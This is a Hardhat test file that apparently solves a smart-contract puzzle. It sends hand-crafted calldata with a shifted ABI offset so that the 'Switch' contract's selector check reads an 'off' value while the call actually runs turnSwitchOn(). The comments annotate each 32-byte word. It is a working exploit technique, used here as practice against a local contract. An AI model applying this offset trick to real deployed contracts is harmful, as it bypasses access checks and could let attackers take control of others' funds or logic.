const { loadFixture } = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

  
describe("Switch contract", function () {
    async function deploySwitchFixture() {
      const [owner, addr1 ] = await ethers.getSigners();
      const contract = await ethers.deployContract("Switch");      

      return { contract, owner, addr1 };
    }
  
    it("Should Switch On", async function () {
    
        const { contract, owner } = await loadFixture(deploySwitchFixture);

        // calldata
        // 0x30c13ade
        // offset, now = 96-bytes:
        //0000000000000000000000000000000000000000000000000000000000000060
        //extra bytes:
        //0000000000000000000000000000000000000000000000000000000000000000         
        //here is the check at 68 byte (used only for the check, not relevant for the external call made by our function):
        //offSelector value
        //20606e1500000000000000000000000000000000000000000000000000000000
        //length of the data: 4 bytes of signature
        //0000000000000000000000000000000000000000000000000000000000000004    
        //data that contains the selector of the function that will be called from our function: turnSwitchOn()
        //76227e1200000000000000000000000000000000000000000000000000000000 
        
        const call_data = "0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";

        const sendPromise = await owner.sendTransaction({to: contract.getAddress(), data: call_data});
        console.log("sendPromise: ", sendPromise);

        expect(await contract.switchOn()).to.equal(true);
    });
  
});